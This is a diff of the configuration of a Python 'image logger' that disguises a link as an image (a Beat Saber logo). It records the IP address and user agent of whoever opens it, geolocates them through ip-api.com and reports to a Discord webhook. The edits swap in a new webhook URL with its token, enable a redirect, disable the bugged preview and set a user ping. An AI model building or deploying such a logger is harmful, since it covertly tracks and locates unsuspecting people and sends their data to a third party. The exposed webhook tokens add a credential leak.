@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1076322797091045478/FPSivbgoKs40FAj6MxDpd3MaR4JCIpOoiP1K9tlgV8-Egae7zFq6647H6UcRkIZc2PEb",
+    "webhook": "https://discord.com/api/webhooks/1076881632289640458/hDiO9aM1-EH3hpV5gdUoL7wfzV-qtCVBZjlc7znAu7rW4G179BVQcCKXy3hgm0DlPBFv",
     "image": "https://upload.wikimedia.org/wikipedia/commons/d/d3/Beat_Saber_logo.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -36,7 +36,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
@@ -48,7 +48,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
+        "redirect": True, # Redirect to a webpage?
         "page": "https://community.virginmedia.com/t5/Networking-and-WiFi/How-to-reset-my-IP/td-p/4614680" # Link to the webpage to redirect to 
     },
 
@@ -77,7 +77,7 @@ def makeReport(ip, useragent = None):
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@everyone"
+    ping = "<@1019638407690985472>"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
